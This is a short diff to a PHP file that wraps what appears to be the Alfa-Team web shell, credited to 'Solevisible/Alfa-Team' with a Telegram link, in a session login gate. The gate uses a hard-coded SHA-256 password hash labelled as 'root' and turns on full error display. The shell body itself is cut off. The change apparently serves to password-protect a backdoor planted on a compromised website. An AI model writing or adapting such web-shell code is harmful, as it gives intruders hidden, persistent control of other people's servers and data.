@@ -1,4 +1,34 @@
 <?php
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
+
+// SHA256 hash untuk password 'root'
+$hashed_password = '8435d000266db81a0bc4da1b2ffb1f91097b87f8347f00b1d8f66aac93a36311';
+
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
+// Cek pakai SHA256
+function verify_password($input_password, $hashed_password) {
+    return hash('sha256', $input_password) === $hashed_password;
+}
+
+// Proses login
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+    if (verify_password($_POST['password'], $hashed_password)) {
+        $_SESSION['logged_in'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit();
+    } else {
+        $error_message = "Password salah.";
+    }
+}
+
+// Kalau belum login, tampilkan form
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+?>
+<?php
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
